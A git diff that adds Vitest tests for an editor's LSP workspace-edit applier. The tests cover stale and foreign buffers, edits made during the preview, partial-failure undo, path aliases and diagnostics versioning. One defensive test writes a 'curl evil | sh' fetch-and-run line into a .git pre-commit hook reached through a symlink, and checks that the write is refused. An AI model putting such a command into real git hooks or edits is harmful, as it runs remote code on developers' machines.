@@ -1,15 +1,19 @@
 // @vitest-environment happy-dom
 // 일괄 편집 적용기(15-m4-plan M4-12 — 결정 M4-D14)의 완료 기준 ① ~ ⑥ · ⑨ · ⑩ 을 가짜 디스크와 실제 문서 모델로 본다.
 
+import { ChangeSet } from "@codemirror/state";
 import { EditorView } from "@codemirror/view";
 import type { LspFileChange, LspTextEdit, LspWorkspaceEdit } from "@pitwall/rpc-client";
 import { describe, expect, it, vi } from "vitest";
 
 import { createDocumentStore, type DocumentStore } from "../editor/documents";
+import { contextDiagnostic } from "./code-actions";
 import { fakeDisk } from "./edit-testing";
 import {
   applyDocumentEdits,
   EditApplier,
+  type EditFs,
+  insideGit,
   lineStarts,
   lspOffset,
   type PreviewFile,
@@ -26,11 +30,13 @@ const text = (
   path: string,
   edits: LspTextEdit[],
   version: number | null = null,
+  foreign = false,
 ): LspFileChange => ({
   kind: "text",
   path,
   version,
   edits,
+  foreign,
 });
 
 async function settle(documents: DocumentStore, path: string) {
@@ -45,6 +51,12 @@ async function settle(documents: DocumentStore, path: string) {
 async function setup(
   files: Record<string, string | { text: string; bom: boolean }>,
   open: string[] = [],
+  options: {
+    /** 적용기에 넘길 파일 RPC(디스크를 감싼 것). */
+    fs?: (disk: ReturnType<typeof fakeDisk>) => EditFs;
+    /** 미리보기가 떠 있는 동안 할 일(사람이 그사이 고친다). */
+    onPreview?: () => void | Promise<void>;
+  } = {},
 ) {
   const disk = fakeDisk(ROOT, files);
   const documents = createDocumentStore(disk.source);
@@ -55,11 +67,12 @@ async function setup(
   let answer = true;
   const workspace = { documents, moved: vi.fn(), deleted: vi.fn() };
   const applier = new EditApplier({
-    fs: disk.fs,
+    fs: options.fs?.(disk) ?? disk.fs,
     workspace,
     synced: () => synced,
     preview: async (files) => {
       previews.push(files);
+      await options.onPreview?.();
       return answer;
     },
   });
@@ -369,5 +382,265 @@ describe("EditApplier", () => {
     expect(env.disk.text("/r/a.ts")).toBe("a\n");
     expect(env.disk.has("/r/sub/b.ts")).toBe(false);
     expect(env.disk.text("/r/gone.ts")).toBe("bye\n");
+  });
+
+  // ---- 리뷰 수정 회차(M4-12) ------------------------------------------------------------------------------------------------
+
+  it("writes nothing when a file is open in another window of the project (H1)", async () => {
+    // 서버는 다른 창의 미저장 버퍼("added\nline0\nfoo\n", 버전 7)를 보고 셋째 줄을 바꾼다 — 디스크 바이트에 쓰면 엉뚱한 자리가 바뀐다.
+    const env = await setup({ "/r/x.ts": "let foo = 1;\n", "/r/y.ts": "line0\nfoo\n" });
+    const before = snapshot(env, ["/r/x.ts", "/r/y.ts"]);
+    const outcome = await env.applier.begin().apply({
+      changes: [
+        text("/r/x.ts", [edit(0, 4, 0, 7, "bar")]),
+        text("/r/y.ts", [edit(2, 0, 2, 3, "bar")], 7, true),
+      ],
+    });
+    expect(outcome).toMatchObject({ kind: "stale", reason: "foreign", files: ["/r/y.ts"] });
+    expect(snapshot(env, ["/r/x.ts", "/r/y.ts"])).toEqual(before);
+    expect(env.disk.calls).toEqual([]);
+    expect(env.previews).toHaveLength(0);
+    expect(env.applier.last).toBeUndefined();
+  });
+
+  it("puts the edit into open documents before any disk write, so typing during the writes stays (H2)", async () => {
+    const env = await setup({ "/r/a.ts": "let foo = 1;\n", "/r/b.ts": "foo();\n" }, ["/r/b.ts"]);
+    env.synced.set("/r/b.ts", 0);
+    const live = env.live("/r/b.ts");
+    // a.ts(닫힘)를 쓰는 사이 사람이 b.ts(열림 · 깨끗) 앞에 한 글자를 친다(리뷰 재현 — 전에는 RangeError 로 멈췄다).
+    env.disk.beforeWrite = (path) => {
+      if (path !== "/r/a.ts") return;
+      env.disk.beforeWrite = undefined;
+      live.applyChanges(ChangeSet.of({ from: 0, insert: "x" }, live.text.length));
+    };
+    const outcome = await env.applier.begin().apply({
+      changes: [
+        text("/r/a.ts", [edit(0, 4, 0, 7, "bar")]),
+        text("/r/b.ts", [edit(0, 0, 0, 3, "bar")], 0),
+      ],
+    });
+    expect(outcome.kind).toBe("applied");
+    expect([...outcome.written].sort()).toEqual(["/r/a.ts", "/r/b.ts"]);
+    expect(env.disk.text("/r/a.ts")).toBe("let bar = 1;\n");
+    expect(env.disk.text("/r/b.ts")).toBe("bar();\n");
+    expect(live.text.toString()).toBe("xbar();\n");
+    // 쓴 파일은 모두 기록에 있다 — 되돌리기는 그사이 고친 b.ts 를 건너뛰고 a.ts 를 되돌린다.
+    const undone = await env.applier.undoLast();
+    expect(undone.reverted).toEqual(["/r/a.ts"]);
+    expect(undone.skipped.map((x) => x.path)).toEqual(["/r/b.ts"]);
+    expect(env.disk.text("/r/a.ts")).toBe("let foo = 1;\n");
+    expect(live.text.toString()).toBe("xbar();\n");
+  });
+
+  it("keeps what it wrote in the undo record when a file operation fails midway (H2)", async () => {
+    const env = await setup(
+      { "/r/a.ts": "let foo = 1;\n", "/r/b.ts": "foo();\n", "/r/c.ts": "foo\n" },
+      ["/r/b.ts"],
+      {
+        fs: (disk) => ({
+          ...disk.fs,
+          rename: async () => {
+            throw new Error("the disk is busy");
+          },
+        }),
+      },
+    );
+    env.synced.set("/r/b.ts", 0);
+    const outcome = await env.applier.begin().apply({
+      changes: [
+        text("/r/b.ts", [edit(0, 0, 0, 3, "bar")], 0),
+        { kind: "rename", from: "/r/c.ts", to: "/r/d.ts", overwrite: false, ignoreIfExists: false },
+        text("/r/a.ts", [edit(0, 4, 0, 7, "bar")]),
+      ],
+    });
+    expect(outcome).toMatchObject({
+      kind: "failed",
+      message: "the disk is busy",
+      written: ["/r/b.ts"],
+    });
+    // 연산이 멈춘 뒤의 열지 않은 파일은 쓰지 않는다.
+    expect(env.disk.text("/r/a.ts")).toBe("let foo = 1;\n");
+    expect(env.applier.last?.entries.map((e) => ("path" in e ? e.path : e.to))).toEqual([
+      "/r/b.ts",
+    ]);
+    const undone = await env.applier.undoLast();
+    expect(undone.reverted).toEqual(["/r/b.ts"]);
+    expect(env.disk.text("/r/b.ts")).toBe("foo();\n");
+  });
+
+  it("checks again after the preview — a document edited meanwhile stops the whole edit (M6)", async () => {
+    let env!: Awaited<ReturnType<typeof setup>>;
+    env = await setup(FILES, ["/r/clean.ts"], {
+      onPreview: () => {
+        const live = env.live("/r/clean.ts");
+        live.applyChanges(ChangeSet.of({ from: 0, insert: "// typed\n" }, live.text.length));
+        env.synced.set("/r/clean.ts", 1);
+      },
+    });
+    env.synced.set("/r/clean.ts", 0);
+    const before = snapshot(env, Object.keys(FILES));
+    const outcome = await env.applier.begin().apply({
+      changes: [RENAME.changes[0]!, RENAME.changes[4]!],
+    });
+    expect(outcome.kind).toBe("stale");
+    expect(env.previews).toHaveLength(1);
+    expect(snapshot(env, Object.keys(FILES))).toEqual(before);
+    expect(env.disk.calls).toEqual([]);
+    expect(env.live("/r/clean.ts").text.toString()).toBe(`// typed\n${FILES["/r/clean.ts"]}`);
+  });
+
+  it("checks again after the preview — a closed file changed meanwhile stops the whole edit (M6)", async () => {
+    let env!: Awaited<ReturnType<typeof setup>>;
+    env = await setup(FILES, [], {
+      onPreview: () =>
+        env.applier.changed({
+          root: ROOT,
+          worktree: null,
+          paths: ["/r/c.ts"],
+          kinds: ["modified"],
+          rescan: false,
+        }),
+    });
+    const before = snapshot(env, Object.keys(FILES));
+    const outcome = await env.applier.begin().apply({ changes: RENAME.changes.slice(2) });
+    expect(outcome).toMatchObject({ kind: "stale", files: ["/r/c.ts"] });
+    expect(snapshot(env, Object.keys(FILES))).toEqual(before);
+    expect(env.disk.calls).toEqual([]);
+  });
+
+  it("leaves an editor-only document alone on undo when it was edited after the edit (M6)", async () => {
+    const { env } = await renamed();
+    const dirty = env.live("/r/dirty.ts");
+    // 같은 길이의 고침(「mine」 → 「ours」) — 역변경이 길이 검사에 걸리지 않고 엉뚱한 자리를 바꿀 수 있는 경우다.
+    const at = dirty.text.toString().indexOf("mine");
+    dirty.applyChanges(ChangeSet.of({ from: at, to: at + 4, insert: "ours" }, dirty.text.length));
+    const undone = await env.applier.undoLast();
+    expect(undone.skipped.map((x) => x.path)).toEqual(["/r/dirty.ts"]);
+    expect(dirty.text.toString()).toBe("import { neo } from './clean';\n// ours\n");
+  });
+
+  it("writes nothing when the edit is no longer wanted after the preview (M2)", async () => {
+    let wanted = true;
+    const env = await setup(FILES, [], {
+      onPreview: () => {
+        wanted = false;
+      },
+    });
+    const before = snapshot(env, Object.keys(FILES));
+    const outcome = await env.applier
+      .begin()
+      .apply({ changes: RENAME.changes.slice(2) }, { wanted: () => wanted });
+    expect(outcome).toMatchObject({ kind: "cancelled", reason: "ended" });
+    expect(snapshot(env, Object.keys(FILES))).toEqual(before);
+    expect(env.disk.calls).toEqual([]);
+    expect(env.applier.last).toBeUndefined();
+  });
+
+  it("refuses a path that leads inside .git through a symbolic link (L1)", async () => {
+    // `tools -> .git` · `hook -> .git/hooks/pre-commit`: Host 는 URI 글자만 보므로 지난다 — 실제 경로로 막는다.
+    const links: Record<string, string> = {
+      "/r/tools": "/r/.git",
+      "/r/hook": "/r/.git/hooks/pre-commit",
+    };
+    const env = await setup({ ...FILES, "/r/.git/hooks/pre-commit": "#!/bin/sh\n" }, [], {
+      fs: (disk) => ({
+        ...disk.fs,
+        stat: async (path) => {
+          const real = links[path];
+          return real ? { ...(await disk.fs.stat(real)), path: real } : disk.fs.stat(path);
+        },
+      }),
+    });
+    const edited = await env.applier.begin().apply({
+      changes: [RENAME.changes[4]!, text("/r/hook", [edit(0, 0, 0, 0, "curl evil | sh\n")])],
+    });
+    expect(edited.kind).toBe("refused");
+    expect(edited.message).toMatch(/inside \.git/);
+    const created = await env.applier.begin().apply({
+      changes: [
+        { kind: "create", path: "/r/tools/post-checkout", overwrite: false, ignoreIfExists: false },
+      ],
+    });
+    expect(created.kind).toBe("refused");
+    expect(created.message).toMatch(/inside \.git/);
+    expect(env.disk.calls).toEqual([]);
+    expect(env.disk.text("/r/.git/hooks/pre-commit")).toBe("#!/bin/sh\n");
+    expect(insideGit("C:\\r\\GIT~1\\config")).toBe(true);
+    expect(insideGit("/r/.GIT/x")).toBe(true);
+    expect(insideGit("/r/.gitignore")).toBe(false);
+  });
+
+  it("puts an edit into a document once when the edit also renames it by another path (L2)", async () => {
+    const alias: Record<string, string> = { "/r/link.ts": "/r/clean.ts" };
+    const env = await setup(FILES, ["/r/clean.ts"], {
+      fs: (disk) => ({
+        ...disk.fs,
+        stat: (path) => disk.fs.stat(alias[path] ?? path),
+        rename: (from, to) => disk.fs.rename(alias[from] ?? from, to),
+      }),
+    });
+    env.synced.set("/r/clean.ts", 0);
+    const outcome = await env.applier.begin().apply({
+      changes: [
+        text("/r/link.ts", [edit(0, 13, 0, 16, "neo")], 0),
+        {
+          kind: "rename",
+          from: "/r/link.ts",
+          to: "/r/moved.ts",
+          overwrite: false,
+          ignoreIfExists: false,
+        },
+      ],
+    });
+    expect(outcome.notWritten).toEqual([]);
+    expect(outcome.kind).toBe("applied");
+    expect(env.live("/r/clean.ts").text.toString()).toBe("export const neo = 1;\n");
+    expect(env.disk.text("/r/moved.ts")).toBe("export const neo = 1;\n");
+  });
+
+  it("leaves an open document as it was when its undo cannot be saved (L5)", async () => {
+    const env = await setup(FILES, ["/r/clean.ts"]);
+    env.synced.set("/r/clean.ts", 0);
+    await env.applier.begin().apply({ changes: [RENAME.changes[0]!] });
+    // 디스크가 바뀌었는데 감시가 아직 알리지 않았다(배너 전).
+    env.disk.edit("/r/clean.ts", "export const other = 2;\n");
+    const undone = await env.applier.undoLast();
+    expect(undone.skipped.map((x) => x.path)).toEqual(["/r/clean.ts"]);
+    expect(env.live("/r/clean.ts").text.toString()).toBe("export const neo = 1;\n");
+    expect(env.disk.text("/r/clean.ts")).toBe("export const other = 2;\n");
+  });
+
+  it("keeps the file scope it had when the flow began (L8)", async () => {
+    const moved = async (): Promise<never> => {
+      throw new Error("the active tab moved to another worktree");
+    };
+    const env = await setup(FILES, [], {
+      fs: (disk) => ({
+        stat: moved,
+        read: moved,
+        write: moved,
+        create: moved,
+        rename: moved,
+        trash: moved,
+        pin: () => disk.fs,
+      }),
+    });
+    const outcome = await env.applier.begin().apply({ changes: [RENAME.changes[4]!] });
+    expect(outcome.kind).toBe("applied");
+    expect(env.disk.text("/r/c.ts")).toBe("const x = neo;");
+    // 되돌리기도 그 범위로.
+    expect((await env.applier.undoLast()).reverted).toEqual(["/r/c.ts"]);
+    expect(env.disk.text("/r/c.ts")).toBe("const x = old;");
+  });
+});
+
+describe("contextDiagnostic", () => {
+  it("sends no diagnostics without the version they belong to (L6)", () => {
+    const d = { message: "unused" };
+    expect(contextDiagnostic({ lsp: [d], servers: ["s"] }, "s")).toBeUndefined();
+    expect(contextDiagnostic({ lsp: [d], servers: ["s"], version: 3 }, "s")).toEqual({
+      version: 3,
+      items: [d],
+    });
   });
 });
